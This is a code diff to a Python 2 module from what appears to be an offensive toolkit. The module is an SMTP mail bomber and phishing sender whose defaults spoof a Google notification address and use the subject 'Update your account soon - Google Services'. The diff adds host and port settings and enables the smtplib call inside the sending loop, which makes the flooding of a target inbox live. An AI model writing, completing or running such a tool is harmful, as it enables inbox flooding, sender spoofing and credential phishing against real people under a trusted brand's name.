@@ -15,6 +15,8 @@ import smtplib               #
 # :-:-:-:-:-:-:-:-:-:-:-:-:- #
 # Default                    #
 # :-:-:-:-:-:-:-:-:-:-:-:-:- #
+defaulthost="127.0.0.1"
+defaultport="110"
 defaultfrom="notification.center@mail.google.com"
 defaultdest="target@services.com"
 defaultsubj="Update your account soon - Google Services"
@@ -22,17 +24,19 @@ defaulttemp="files/tmtSMTP/updateaccount.template"
 defaultmany="30"
 # :-:-:-:-:-:-:-:-:-:-:-:-:- #
 
-def run(para,parb,parc,pard,pare):
-	global defaultfrom,defaultdest,defaultsubj,defaulttemp,defaultmany
-	defaultfrom=para
-	defaultdest=parb
-	defaultsubj=parc
-	defaulttemp=pard
-	defaultmany=pare
+def run(host, port, frome, target, subject, file, many):
+	global defaulthost,defaultport,defaultfrom,defaultdest,defaultsubj,defaulttemp,defaultmany
+	defaulthost=host
+	defaultport=port
+	defaultfrom=frome
+	defaultdest=target
+	defaultsubj=subject
+	defaulttemp=file
+	defaultmany=many
 	smtpbombing(1)
 
 def smtpbombing(run):
-	global defaultfrom,defaultdest,defaultsubj,defaulttemp,defaultmany
+	global defaulthost,defaultport,defaultfrom,defaultdest,defaultsubj,defaulttemp,defaultmany
 	try:
 		if run!=1:
 			actions=raw_input(d.prompt("eng/mailboom"))
@@ -40,6 +44,8 @@ def smtpbombing(run):
 			actions="run"
 		if actions == "show options" or actions == "sop":
 			d.option()
+			d.descrip("host","yes","IP or DNS",defaulthost)
+			d.descrip("port","no","Port",defaultport)
 			d.descrip("target","yes","E-mail target",defaultdest)
 			d.descrip("from","yes","E-mail fake",defaultfrom)
  			d.descrip("subjet","yes","Subject fake",defaultsubj)
@@ -47,6 +53,12 @@ def smtpbombing(run):
 			d.descrip("many","no","Amount to send",defaultmany)
 			print ""
 			smtpbombing(0)
+		elif actions[0:8] == "set host":
+			defaulthost=ping.update(defaulthost,actions,"host")
+			d.change("host",defaulthost)
+		elif actions[0:8] == "set port":
+			defaultport=ping.update(defaultport,actions,"port")
+			d.change("port",defaultport)
 		elif actions[0:10] == "set target":
 			defaultdest = actions[11:]
 			d.change("target",defaultdest)
@@ -82,7 +94,7 @@ def smtpbombing(run):
 					while 0 < i:
 						i-=1
 						try:
-							#smtp = smtplib.SMTP('127.0.0.1', 1024)
+							smtp = smtplib.SMTP(defaulthost, defaultport)
 						 	smtp.sendmail(defaultfrom, defaultdest, body) 
 						 	if True:
 						 		print " "+Suf+" ("+str(i)+")E-Mail was sent."
